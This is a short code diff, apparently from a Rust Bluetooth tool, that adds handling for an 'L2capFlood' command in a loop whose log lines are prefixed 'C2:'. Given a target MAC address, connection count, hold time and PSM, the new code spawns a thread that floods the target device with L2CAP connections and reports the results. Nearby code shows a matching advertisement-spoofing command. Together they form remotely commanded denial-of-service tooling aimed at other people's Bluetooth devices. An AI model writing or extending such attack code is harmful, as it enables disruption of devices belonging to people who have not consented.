@@ -1647,6 +1647,29 @@ pub fn run_live(cfg: LiveConfig<'_>) -> Result<(), String> {
                                         ControlCommand::SpoofAdv { .. } => {
                                             eprintln!("C2: spoof ignored (compiled without hci feature)");
                                         }
+                                        #[cfg(feature = "hci")]
+                                        ControlCommand::L2capFlood { mac, count, hold_secs, psm, req_id: _ } => {
+                                            eprintln!("C2: L2CAP flood {} x{} hold={}s psm={}",
+                                                mac, count, hold_secs, psm);
+                                            let config = bd_hci::L2capFloodConfig {
+                                                mac,
+                                                count,
+                                                hold_secs,
+                                                psm,
+                                            };
+                                            std::thread::Builder::new()
+                                                .name("l2cap-flood".to_string())
+                                                .spawn(move || {
+                                                    let result = bd_hci::l2cap_flood(&config);
+                                                    eprintln!("C2: L2CAP flood done: {} open, {} failed",
+                                                        result.connections_opened, result.connections_failed);
+                                                })
+                                                .ok();
+                                        }
+                                        #[cfg(not(feature = "hci"))]
+                                        ControlCommand::L2capFlood { .. } => {
+                                            eprintln!("C2: L2CAP flood ignored (compiled without hci feature)");
+                                        }
                                     },
                                     Err(crossbeam::channel::RecvTimeoutError::Timeout) => continue,
                                     Err(_) => break,
